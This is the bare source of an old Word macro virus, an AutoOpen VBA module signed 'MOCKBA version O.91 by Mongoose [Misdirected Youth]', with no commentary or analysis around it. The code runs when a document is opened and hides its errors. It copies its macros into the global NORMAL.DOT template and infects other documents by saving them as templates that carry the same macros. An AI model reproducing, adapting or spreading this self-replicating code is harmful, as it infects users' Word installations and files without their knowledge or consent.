   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim d$
   Dim info$
   Dim Ill
   Dim i
   Dim Infected
   On Error Resume Next
   d$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
   info$ = "MOCKBA version O.91 by Mongoose [Misdirected Youth]"
   If GetAttr(d$) < 32 Then GoTo Del
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="AutoOpen", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="FileTemplates", Tab:=3
   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=d$, Name:="ToolsMacro", Tab:=3
   Ill = WordBasic.CountMacros(0)
   If Ill > 0 Then
    For i = 1 To Ill
     If WordBasic.[MacroName$](i, 1) = "FileTemplates" Then Infected = 13
    Next i
   End If
   If Infected <> 13 Then
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.MacroCopy "FileTemplates", WordBasic.[FileName$]() + ":FileTemplates"
    WordBasic.MacroCopy "FileTemplates", WordBasic.[FileName$]() + ":ToolsMacro"
   End If
   End Sub
